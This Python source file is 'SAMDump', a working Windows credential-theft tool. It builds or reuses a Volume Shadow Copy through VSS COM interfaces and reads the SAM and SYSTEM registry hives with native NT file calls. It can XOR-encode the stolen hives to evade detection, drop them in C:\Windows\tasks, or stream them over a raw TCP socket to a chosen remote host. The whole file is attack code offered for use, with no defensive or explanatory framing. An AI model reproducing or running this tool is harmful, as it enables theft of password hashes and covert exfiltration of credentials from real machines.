import sys
import ctypes
import socket
import struct
import argparse
from ctypes import *
from ctypes.wintypes import *
from comtypes import GUID, IUnknown, COMMETHOD, HRESULT, BSTR
from comtypes import CoInitializeEx, CoUninitialize, COINIT_MULTITHREADED


# Constants
VSS_CTX_BACKUP = 0
VSS_CTX_ALL = 0xffffffff
VSS_BT_FULL = 1
GUID_NULL = GUID()
FILE_READ_DATA = 0x0001
FILE_READ_ATTRIBUTES = 0x0080
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
FILE_OPEN = 0x00000001
FILE_WRITE_DATA = 0x0002
FILE_WRITE_ATTRIBUTES = 0x0100
SYNCHRONIZE = 0x00100000
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_OVERWRITE_IF = 0x00000005
FILE_SYNCHRONOUS_IO_NONALERT = 0x00000010

# Enums
class VSS_OBJECT_TYPE(ctypes.c_int):
    VSS_OBJECT_UNKNOWN = 0
    VSS_OBJECT_NONE = 1
    VSS_OBJECT_SNAPSHOT_SET = 2
    VSS_OBJECT_SNAPSHOT = 3
    VSS_OBJECT_PROVIDER = 4
    VSS_OBJECT_TYPE_COUNT = 5

# Structs
class VSS_SNAPSHOT_PROP(Structure):
    _pack_ = 8
    _fields_ = [
        ("m_SnapshotId", GUID),
        ("m_SnapshotSetId", GUID),
        ("m_lSnapshotsCount", LONG),
        ("m_pwszSnapshotDeviceObject", LPWSTR),
        ("m_pwszOriginalVolumeName", LPWSTR),
        ("m_pwszOriginatingMachine", LPWSTR),
        ("m_pwszServiceMachine", LPWSTR),
        ("m_pwszExposedName", LPWSTR),
        ("m_pwszExposedPath", LPWSTR),
        ("m_ProviderId", GUID),
        ("m_lSnapshotAttributes", LONG),
        ("m_tsCreationTimestamp", c_longlong),
        ("m_eStatus", LONG),
    ]

class VSS_OBJECT_UNION(Union):
    _fields_ = [("Snap", VSS_SNAPSHOT_PROP)]

class VSS_OBJECT_PROP(Structure):
    _fields_ = [
        ("Type", ctypes.c_int),
        ("Obj", VSS_OBJECT_UNION),
    ]

class UNICODE_STRING(Structure):
    _fields_ = [
        ("Length", USHORT),
        ("MaximumLength", USHORT),
        ("Buffer", LPWSTR),
    ]

class OBJECT_ATTRIBUTES(Structure):
    _fields_ = [
        ("Length", ULONG),
        ("RootDirectory", HANDLE),
        ("ObjectName", POINTER(UNICODE_STRING)),
        ("Attributes", ULONG),
        ("SecurityDescriptor", c_void_p),
        ("SecurityQualityOfService", c_void_p),
    ]

if sys.maxsize > 2**32:
    ULONG_PTR = c_ulonglong
else:
    ULONG_PTR = c_ulong
class IO_STATUS_BLOCK(Structure):
    _fields_ = [
        ("Status", ULONG),
        ("Information", ULONG_PTR),
    ]

# Interfaces
class IVssEnumObject(IUnknown):
    _iid_ = GUID("{AE1C7110-2F60-11d3-8A39-00C04F72D8E3}")
    _methods_ = [
        COMMETHOD([], HRESULT, 'Next',
                  (['in'], ULONG, 'celt'),
                  (['out'], POINTER(VSS_OBJECT_PROP), 'rgelt'),
                  (['out'], POINTER(ULONG), 'pceltFetched')),
        COMMETHOD([], HRESULT, 'Skip',
                  (['in'], ULONG, 'celt')),
        COMMETHOD([], HRESULT, 'Reset'),
        COMMETHOD([], HRESULT, 'Clone',
                  (['out'], POINTER(POINTER(IUnknown)), 'ppenum')),
    ]

class IVssAsync(IUnknown):
    _iid_ = GUID("{507C37B4-CF5B-4e95-B0AF-14EB9767467E}")
    _methods_ = [
        COMMETHOD([], HRESULT, 'Cancel'),
        COMMETHOD([], HRESULT, 'Wait',
                  (['in'], DWORD, 'dwMilliseconds')),
        COMMETHOD([], HRESULT, 'QueryStatus',
                  (['out'], POINTER(HRESULT), 'pHrResult'),
                  (['out'], POINTER(INT), 'pReserved')),
    ]

class IVssBackupComponents(IUnknown):
    _iid_ = GUID("{665c1d5f-c218-414d-a05d-7fef5f9d5c86}")
    _methods_ = [
        COMMETHOD([], HRESULT, 'GetWriterComponentsCount',
                  (['out'], POINTER(UINT), 'pcComponents')),
        COMMETHOD([], HRESULT, 'GetWriterComponents',
                  (['in'], UINT, 'iWriter'),
                  (['out'], POINTER(POINTER(IUnknown)), 'ppWriter')),
        COMMETHOD([], HRESULT, 'InitializeForBackup',
                  (['in'], BSTR, 'bstrXML')),
        COMMETHOD([], HRESULT, 'SetBackupState',
                  (['in'], BOOL, 'bSelectComponents'),
                  (['in'], BOOL, 'bBackupBootableSystemState'),
                  (['in'], ctypes.c_int, 'backupType'),
                  (['in'], BOOL, 'bPartialFileSupport')),
        COMMETHOD([], HRESULT, 'InitializeForRestore',
                  (['in'], BSTR, 'bstrXML')),
        COMMETHOD([], HRESULT, 'SetRestoreState',
                  (['in'], ctypes.c_int, 'restoreType')),
        COMMETHOD([], HRESULT, 'GatherWriterMetadata',
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
        COMMETHOD([], HRESULT, 'GetWriterMetadataCount',
                  (['out'], POINTER(UINT), 'pcWriters')),
        COMMETHOD([], HRESULT, 'GetWriterMetadata',
                  (['in'], UINT, 'iWriter'),
                  (['out'], POINTER(GUID), 'pInstanceId'),
                  (['out'], POINTER(POINTER(IUnknown)), 'ppMetadata')),
        COMMETHOD([], HRESULT, 'FreeWriterMetadata'),
        COMMETHOD([], HRESULT, 'AddComponent',
                  (['in'], POINTER(GUID), 'instanceId'),
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName')),
        COMMETHOD([], HRESULT, 'PrepareForBackup',
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
        COMMETHOD([], HRESULT, 'AbortBackup'),
        COMMETHOD([], HRESULT, 'GatherWriterStatus',
                  (['out'], POINTER(POINTER(IVssAsync)), 'pAsync')),
        COMMETHOD([], HRESULT, 'GetWriterStatusCount',
                  (['out'], POINTER(UINT), 'pcWriters')),
        COMMETHOD([], HRESULT, 'FreeWriterStatus'),
        COMMETHOD([], HRESULT, 'GetWriterStatus',
                  (['in'], UINT, 'iWriter'),
                  (['out'], POINTER(GUID), 'pidInstance'),
                  (['out'], POINTER(GUID), 'pidWriter'),
                  (['out'], POINTER(BSTR), 'pbstrWriter'),
                  (['out'], POINTER(ctypes.c_int), 'pnStatus'),
                  (['out'], POINTER(ctypes.c_int), 'phrFailureWriter'),
                  (['out'], POINTER(ctypes.c_int), 'phrApplication'),
                  (['out'], POINTER(BSTR), 'pbstrApplicationMessage')),
        COMMETHOD([], HRESULT, 'SetBackupSucceeded',
                  (['in'], POINTER(GUID), 'instanceId'),
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], BOOL, 'bSucceeded')),
        COMMETHOD([], HRESULT, 'SetBackupOptions',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], LPCWSTR, 'wszBackupOptions')),
        COMMETHOD([], HRESULT, 'SetSelectedForRestore',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], BOOL, 'bSelectedForRestore')),
        COMMETHOD([], HRESULT, 'SetRestoreOptions',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], LPCWSTR, 'wszRestoreOptions')),
        COMMETHOD([], HRESULT, 'SetAdditionalRestores',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], BOOL, 'bAdditionalRestores')),
        COMMETHOD([], HRESULT, 'SetPreviousBackupStamp',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], LPCWSTR, 'wszPreviousBackupStamp')),
        COMMETHOD([], HRESULT, 'SaveAsXML',
                  (['out'], POINTER(BSTR), 'pbstrXML')),
        COMMETHOD([], HRESULT, 'BackupComplete',
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
        COMMETHOD([], HRESULT, 'AddAlternativeLocationMapping',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], LPCWSTR, 'wszPath'),
                  (['in'], LPCWSTR, 'wszFilespec'),
                  (['in'], BOOL, 'bRecursive'),
                  (['in'], LPCWSTR, 'wszDestination')),
        COMMETHOD([], HRESULT, 'AddRestoreSubcomponent',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], LPCWSTR, 'wszSubComponentLogicalPath'),
                  (['in'], LPCWSTR, 'wszSubComponentName'),
                  (['in'], BOOL, 'bRepair')),
        COMMETHOD([], HRESULT, 'SetFileRestoreStatus',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], ctypes.c_int, 'status')),
        COMMETHOD([], HRESULT, 'AddNewTarget',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], LPCWSTR, 'wszPath'),
                  (['in'], LPCWSTR, 'wszFileName'),
                  (['in'], BOOL, 'bRecursive'),
                  (['in'], LPCWSTR, 'wszAlternatePath')),
        COMMETHOD([], HRESULT, 'SetRangesFilePath',
                  (['in'], POINTER(GUID), 'writerId'),
                  (['in'], ctypes.c_int, 'ct'),
                  (['in'], LPCWSTR, 'wszLogicalPath'),
                  (['in'], LPCWSTR, 'wszComponentName'),
                  (['in'], UINT, 'iPartialFile'),
                  (['in'], LPCWSTR, 'wszRangesFile')),
        COMMETHOD([], HRESULT, 'PreRestore',
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
        COMMETHOD([], HRESULT, 'PostRestore',
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
        COMMETHOD([], HRESULT, 'SetContext',
                  (['in'], LONG, 'lContext')),
        COMMETHOD([], HRESULT, 'StartSnapshotSet',
                  (['out'], POINTER(GUID), 'pSnapshotSetId')),
        COMMETHOD([], HRESULT, 'AddToSnapshotSet',
                  (['in'], LPCWSTR, 'pwszVolumeName'),
                  (['in'], POINTER(GUID), 'ProviderId'),
                  (['out'], POINTER(GUID), 'pidSnapshot')),
        COMMETHOD([], HRESULT, 'DoSnapshotSet',
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
        COMMETHOD([], HRESULT, 'DeleteSnapshots',
                  (['in'], GUID, 'SourceObjectId'),
                  (['in'], ctypes.c_int, 'eSourceObjectType'),
                  (['in'], BOOL, 'bForceDelete'),
                  (['out'], POINTER(LONG), 'plDeletedSnapshots'),
                  (['out'], POINTER(GUID), 'pNondeletedSnapshotID')),
        COMMETHOD([], HRESULT, 'ImportSnapshots',
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
        COMMETHOD([], HRESULT, 'BreakSnapshotSet',
                  (['in'], POINTER(GUID), 'SnapshotSetId')),
        COMMETHOD([], HRESULT, 'GetSnapshotProperties',
                  (['in'], POINTER(GUID), 'SnapshotId'),
                  (['out'], POINTER(VSS_SNAPSHOT_PROP), 'pProp')),
        COMMETHOD([], HRESULT, 'Query',
                  (['in'], POINTER(GUID), 'QueriedObjectId'),
                  (['in'], ctypes.c_int, 'eQueriedObjectType'),
                  (['in'], ctypes.c_int, 'eReturnedObjectsType'),
                  (['out'], POINTER(POINTER(IVssEnumObject)), 'ppEnum')),
        COMMETHOD([], HRESULT, 'IsVolumeSupported',
                  (['in'], POINTER(GUID), 'ProviderId'),
                  (['in'], LPCWSTR, 'pwszVolumeName'),
                  (['out'], POINTER(BOOL), 'pbSupportedByThisProvider')),
        COMMETHOD([], HRESULT, 'DisableWriterClasses',
                  (['in'], POINTER(GUID), 'rgWriterClassId'),
                  (['in'], UINT, 'cClassId')),
        COMMETHOD([], HRESULT, 'EnableWriterClasses',
                  (['in'], POINTER(GUID), 'rgWriterClassId'),
                  (['in'], UINT, 'cClassId')),
        COMMETHOD([], HRESULT, 'DisableWriterInstances',
                  (['in'], POINTER(GUID), 'rgWriterInstanceId'),
                  (['in'], UINT, 'cInstanceId')),
        COMMETHOD([], HRESULT, 'ExposeSnapshot',
                  (['in'], POINTER(GUID), 'SnapshotId'),
                  (['in'], LPCWSTR, 'wszPathFromRoot'),
                  (['in'], LONG, 'lAttributes'),
                  (['in'], LPCWSTR, 'wszExpose'),
                  (['out'], POINTER(LPWSTR), 'pwszExposed')),
        COMMETHOD([], HRESULT, 'RevertToSnapshot',
                  (['in'], POINTER(GUID), 'SnapshotId'),
                  (['in'], BOOL, 'bForceDismount')),
        COMMETHOD([], HRESULT, 'QueryRevertStatus',
                  (['in'], LPCWSTR, 'pwszVolume'),
                  (['out'], POINTER(POINTER(IVssAsync)), 'ppAsync')),
    ]


try:
    vssapi = ctypes.WinDLL("VssApi.dll")
    VssFreeSnapshotProperties = vssapi.VssFreeSnapshotProperties
    VssFreeSnapshotProperties.argtypes = [POINTER(VSS_SNAPSHOT_PROP)]
    VssFreeSnapshotProperties.restype = None
except OSError as e:
    print(f"[-] Error loading VssApi.dll: {e}")
    sys.exit(1)

try:
    ntdll = ctypes.WinDLL("ntdll.dll")
    NtCreateFile = ntdll.NtCreateFile
    NtReadFile = ntdll.NtReadFile
    NtWriteFile = ntdll.NtWriteFile
    NtClose = ntdll.NtClose
except Exception as e:
    print(f"[-] Error loading ntdll.dll functions: {e}")
    sys.exit(1)


def is_administrator():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def create_vss_backup_components():
    possible_names = [
        "CreateVssBackupComponentsInternal",
        "CreateVssBackupComponents",
        "?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z",
    ]
    
    create_func = None
    for name in possible_names:
        try:
            create_func = getattr(vssapi, name)
            break
        except AttributeError:
            continue
    
    if create_func is None:
        raise Exception("Could not find CreateVssBackupComponents in VssApi.dll")
    
    create_func.restype = HRESULT
    create_func.argtypes = [POINTER(POINTER(IVssBackupComponents))]
    
    backup = POINTER(IVssBackupComponents)()
    hr = create_func(byref(backup))
    
    if hr != 0:
        raise Exception(f"CreateVssBackupComponents failed with HRESULT: 0x{hr:08X}")
    
    if not backup:
        raise Exception("CreateVssBackupComponents returned NULL")
    
    return backup


def list_shadows():
    com_initialized = False
    try:
        CoInitializeEx(COINIT_MULTITHREADED)
        com_initialized = True
    except OSError as e:
        if e.winerror not in (-2147417850, 0, 1):
            print(f"[-] Error initializing COM: {e}")
            return None
    
    backup = None
    enum_obj = None
    
    try:
        backup = create_vss_backup_components()
        hr = backup.InitializeForBackup(None)
        if hr != 0:
            return None
        
        hr = backup.SetContext(VSS_CTX_ALL)
        if hr != 0:
            hr = backup.SetContext(VSS_CTX_BACKUP)
            if hr != 0:
                return None
        
        guid_null = GUID()
        enum_obj_ptr = backup.Query(
            guid_null,
            VSS_OBJECT_TYPE.VSS_OBJECT_NONE,
            VSS_OBJECT_TYPE.VSS_OBJECT_SNAPSHOT
        )
        
        if not enum_obj_ptr:
            return None
        
        enum_obj = enum_obj_ptr
        
        while True:
            try:
                result = enum_obj.Next(1)
                if not result or len(result) < 2:
                    break
                    
                prop, fetched = result
                if fetched == 0:
                    break
                
                if prop.Type == VSS_OBJECT_TYPE.VSS_OBJECT_SNAPSHOT:
                    snap = prop.Obj.Snap
                    if snap.m_pwszSnapshotDeviceObject:
                        device_object = ctypes.wstring_at(snap.m_pwszSnapshotDeviceObject)
                        VssFreeSnapshotProperties(byref(snap))
                        print(f"[+] Shadow copy found: {device_object}")
                        return device_object
                    VssFreeSnapshotProperties(byref(snap))
            except:
                break
        
        return None
        
    except:
        return None
    finally:
        if enum_obj:
            del enum_obj
        if backup:
            del backup
        if com_initialized:
            CoUninitialize()


def create_shadow_copy(volume_path):
    com_initialized = False
    try:
        CoInitializeEx(COINIT_MULTITHREADED)
        com_initialized = True
    except OSError as e:
        if e.winerror not in (-2147417850, 0, 1):
            print(f"[-] Error initializing COM: {e}")
            return None
    
    backup = None
    
    try:
        print(f"[+] Creating shadow copy for: {volume_path}")
        
        backup = create_vss_backup_components()
        hr = backup.InitializeForBackup(None)
        if hr != 0:
            print(f"[-] Error in InitializeForBackup: 0x{hr:08X}")
            return None
        
        guid_null = GUID()
        try:
            result = backup.IsVolumeSupported(guid_null, volume_path)
            b_supported = result[0] if isinstance(result, tuple) else result
            if not b_supported:
                print(f"[-] Volume {volume_path} not supported for shadow copies")
                return None
        except:
            pass
        
        hr = backup.SetContext(VSS_CTX_BACKUP)
        if hr != 0:
            print(f"[-] Error in SetContext: 0x{hr:08X}")
            return None
        
        backup.SetBackupState(False, False, VSS_BT_FULL, False)
        
        try:
            async_metadata = backup.GatherWriterMetadata()
            if async_metadata:
                async_metadata.Wait(0xFFFFFFFF)
        except:
            pass
        
        snapshot_set_id = backup.StartSnapshotSet()
        if not snapshot_set_id:
            print("[-] Error in StartSnapshotSet")
            return None
        
        snapshot_id = backup.AddToSnapshotSet(volume_path, guid_null)
        if not snapshot_id:
            print("[-] Error in AddToSnapshotSet")
            return None
        
        try:
            async_prepare = backup.PrepareForBackup()
            if async_prepare:
                async_prepare.Wait(0xFFFFFFFF)
        except:
            pass
        
        try:
            async_snapshot = backup.DoSnapshotSet()
            if async_snapshot:
                hr = async_snapshot.Wait(0xFFFFFFFF)
        except:
            hr = -1
        
        if hr == 0:
            try:
                snap_prop = backup.GetSnapshotProperties(snapshot_id)
                if snap_prop and snap_prop.m_pwszSnapshotDeviceObject:
                    device_object = ctypes.wstring_at(snap_prop.m_pwszSnapshotDeviceObject)
                    VssFreeSnapshotProperties(byref(snap_prop))
                    print(f"[+] Shadow copy created: {device_object}")
                    return device_object
            except:
                pass
        
        return None
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return None
    finally:
        if backup:
            del backup
        if com_initialized:
            CoUninitialize()


def verify_shadow_ready(shadow_path, max_retries=10, delay=1):
    test_path = shadow_path + "\\windows\\system32\\config\\sam"
    
    for attempt in range(max_retries):
        file_handle = open_file_nt(test_path)
        if file_handle:
            NtClose(file_handle)
            print("[+] Shadow copy is ready")
            return True
        
        if attempt < max_retries - 1:
            print(f"[*] Shadow copy not ready yet, waiting... (attempt {attempt + 1}/{max_retries})")
            time.sleep(delay)
    
    return False


def open_file_nt(file_path):
    unicode_str = UNICODE_STRING()
    unicode_str.Buffer = file_path
    unicode_str.Length = len(file_path) * 2
    unicode_str.MaximumLength = unicode_str.Length + 2
    
    obj_attr = OBJECT_ATTRIBUTES()
    obj_attr.Length = sizeof(OBJECT_ATTRIBUTES)
    obj_attr.RootDirectory = None
    obj_attr.ObjectName = pointer(unicode_str)
    obj_attr.Attributes = 0x40
    obj_attr.SecurityDescriptor = None
    obj_attr.SecurityQualityOfService = None
    
    io_status = IO_STATUS_BLOCK()
    file_handle = HANDLE()
    
    status = NtCreateFile(
        byref(file_handle),
        FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
        byref(obj_attr),
        byref(io_status),
        None,
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        None,
        0
    )
    
    if status != 0:
        return None
    
    return file_handle


def read_file_nt(file_handle):
    file_content = bytearray()
    byte_offset = c_longlong(0)
    
    while True:
        io_status = IO_STATUS_BLOCK()
        buffer = create_string_buffer(4096)
        
        status = NtReadFile(
            file_handle,
            None,
            None,
            None,
            byref(io_status),
            buffer,
            sizeof(buffer),
            byref(byte_offset),
            None
        )
        
        if status == 0xC0000011:
            break
        
        if status != 0 and status != 0x00000103:
            break
        
        bytes_read = io_status.Information
        
        if bytes_read == 0:
            break
        
        file_content.extend(buffer.raw[:bytes_read])
        byte_offset.value += bytes_read
    
    return bytes(file_content)


def read_file(file_path):
    file_handle = open_file_nt(file_path)
    if not file_handle:
        print(f"[-] Error opening file: {file_path}")
        return None
    
    content = read_file_nt(file_handle)
    NtClose(file_handle)
    
    print(f"[+] Read {len(content)} bytes from {file_path}")
    return content


def write_file_nt(file_path, data):
    unicode_str = UNICODE_STRING()
    unicode_str.Buffer = file_path
    unicode_str.Length = len(file_path) * 2
    unicode_str.MaximumLength = unicode_str.Length + 2
    
    obj_attr = OBJECT_ATTRIBUTES()
    obj_attr.Length = sizeof(OBJECT_ATTRIBUTES)
    obj_attr.RootDirectory = None
    obj_attr.ObjectName = pointer(unicode_str)
    obj_attr.Attributes = 0x40
    obj_attr.SecurityDescriptor = None
    obj_attr.SecurityQualityOfService = None
    
    io_status = IO_STATUS_BLOCK()
    file_handle = HANDLE()
    
    status = NtCreateFile(
        byref(file_handle),
        FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
        byref(obj_attr),
        byref(io_status),
        None,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        None,
        0
    )
    
    if status != 0:
        print(f"[-] Error creating file: {file_path}, NTSTATUS: 0x{status:08X}")
        return False
    
    byte_offset = c_longlong(0)
    
    status = NtWriteFile(
        file_handle,
        None,
        None,
        None,
        byref(io_status),
        data,
        len(data),
        byref(byte_offset),
        None
    )
    
    if status != 0:
        print(f"[-] Error writing file: {file_path}, NTSTATUS: 0x{status:08X}")
        NtClose(file_handle)
        return False
    
    print(f"[+] Written {len(data)} bytes to {file_path}")
    NtClose(file_handle)
    return True


def xor_encode(data, key):
    if not key:
        return data
    
    key_bytes = key.encode() if isinstance(key, str) else key
    encoded = bytearray(data)
    
    for i in range(len(encoded)):
        encoded[i] ^= key_bytes[i % len(key_bytes)]
    
    return bytes(encoded)


def send_file_over_socket(sock, filename, filedata):
    header = struct.pack('32sII', 
                        filename.encode()[:32].ljust(32, b'\x00'),
                        len(filedata),
                        0)
    
    try:
        sock.sendall(header)
        sock.sendall(filedata)
        print(f"[+] {filename} sent ({len(filedata)} bytes)")
        return True
    except Exception as e:
        print(f"[-] Error sending {filename}: {e}")
        return False


def send_files_remotely(sam_data, system_data, host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        print(f"[+] Connected to {host}:{port}")
        
        success = True
        success &= send_file_over_socket(sock, "SAM", sam_data)
        success &= send_file_over_socket(sock, "SYSTEM", system_data)
        
        sock.close()
        return success
        
    except Exception as e:
        print(f"[-] Error connecting to {host}:{port}: {e}")
        return False


def save_files_locally(sam_data, system_data, base_path, sam_fname, system_fname):
    sam_path = f"\\??\\{base_path}{sam_fname}"
    system_path = f"\\??\\{base_path}{system_fname}"
    
    success = True
    success &= write_file_nt(sam_path, sam_data)
    success &= write_file_nt(system_path, system_data)
    
    if success:
        print("[+] Success saving files locally")
    else:
        print("[-] Error saving files locally")
    
    return success


def main():
    parser = argparse.ArgumentParser(description='SAMDump - Extract SAM and SYSTEM from Shadow Copy')
    parser.add_argument('--save-local', action='store_true', help='Save files locally')
    parser.add_argument('--output-dir', default='C:\\Windows\\tasks', help='Output directory (default: C:\\Windows\\tasks)')
    parser.add_argument('--send-remote', action='store_true', help='Send files remotely')
    parser.add_argument('--host', default='127.0.0.1', help='Remote host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=7777, help='Remote port (default: 7777)')
    parser.add_argument('--xor-encode', action='store_true', help='XOR encode files')
    parser.add_argument('--xor-key', default='SAMDump2025', help='XOR key (default: SAMDump2025)')
    parser.add_argument('--disk', default='C:\\', help='Disk to create shadow copy (default: C:\\)')
    args = parser.parse_args()
    
    if not args.save_local and not args.send_remote:
        parser.print_help()
        print("\n[-] Error: You must specify --save-local or --send-remote")
        sys.exit(1)
    
    if not is_administrator():
        print("[-] ERROR: Administrator privileges required")
        sys.exit(1)
    
    print("[+] Checking for existing shadow copies...")
    shadow_device = list_shadows()
    
    if not shadow_device:
	    print("[+] No shadow copies found. Creating a new one...")
	    shadow_device = create_shadow_copy(args.disk)
	    
	    if not shadow_device:
	        print("[-] Failed to create shadow copy")
	        sys.exit(1)
	    
	    print("[+] Verifying shadow copy readiness...")
	    test_device = shadow_device.replace("\\\\?\\", "\\??\\") if shadow_device.startswith("\\\\?\\") else shadow_device
	    
	    if not verify_shadow_ready(test_device):
	        print("[-] Shadow copy not ready after waiting")
	        sys.exit(1)

    if shadow_device.startswith("\\\\?\\"):
        shadow_device = shadow_device.replace("\\\\?\\", "\\??\\")
    
    sam_path = shadow_device + "\\windows\\system32\\config\\sam"
    system_path = shadow_device + "\\windows\\system32\\config\\system"
    
    print(f"[+] Reading files from shadow copy...")
    sam_data = read_file(sam_path)
    system_data = read_file(system_path)
    
    if not sam_data or not system_data:
        print("[-] Error reading files from shadow copy")
        sys.exit(1)
    
    if args.xor_encode:
        print(f"[+] XOR-encoding with key: {args.xor_key}")
        sam_data = xor_encode(sam_data, args.xor_key)
        system_data = xor_encode(system_data, args.xor_key)
        print("[+] Files XOR-encoded")
    
    if args.save_local:
        save_files_locally(sam_data, system_data, args.output_dir, "\\sam.txt", "\\system.txt")
    
    if args.send_remote:
        if send_files_remotely(sam_data, system_data, args.host, args.port):
            print("[+] Success sending files remotely")
        else:
            print("[-] Error sending files remotely")
    
    print("[+] Done!")


if __name__ == "__main__":
    main()